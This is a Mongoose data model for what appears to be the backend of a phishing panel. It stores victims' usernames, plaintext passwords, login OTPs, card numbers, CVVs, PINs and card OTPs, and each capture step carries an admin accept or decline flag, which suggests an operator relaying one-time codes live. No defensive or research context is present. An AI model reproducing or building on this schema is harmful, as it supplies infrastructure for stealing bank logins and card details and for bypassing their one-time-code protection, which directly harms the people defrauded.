const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema(
    {
      username: String,
      password: String,
      chosenCountry: String,
      loginAccept: {
        type: Boolean,
        default: false,
      },

      otpLogin: String,
      otpLoginAccept: {
        type: Boolean,
        default: false,
      },

      cardNumber: String,
      cardName: String,
      cvv: String,
      expiryDate: String,
      pin: String,
      cardAccept: {
        type: Boolean,
        default: false,
      },

      cardOtp: String,
      cardOtpAccept: {
        type: Boolean,
        default: false,
      },

      name: String,
      email: String,
      phone: String,
      country: String,
      state: String,
      street: String,
      formAccept: {
        type: Boolean,
        default: false,
      },


      visa_brand: String,
      visa_type: String,
      visa_issuer: String,
      checked: {
        type: Boolean,
        default: false,
      },

      /** Pending admin review — hide actions after accept/decline until visitor resubmits */
      reviewLogin: { type: Boolean, default: false },
      reviewLoginOtp: { type: Boolean, default: false },
      reviewVisa: { type: Boolean, default: false },
      reviewCardOtp: { type: Boolean, default: false },
      reviewForm: { type: Boolean, default: false },

      rejectReason: String,

      /** رسائل الزائر من شاشة «نجاح الطلب» — للعرض في الإدمن فقط */
      visitorChatMessages: {
        type: [
          {
            text: { type: String, maxlength: 8000 },
            at: { type: Date, default: Date.now },
          },
        ],
        default: [],
      },

      created: { type: Date, default: Date.now },
    },
    { timestamps: true }
  )
);
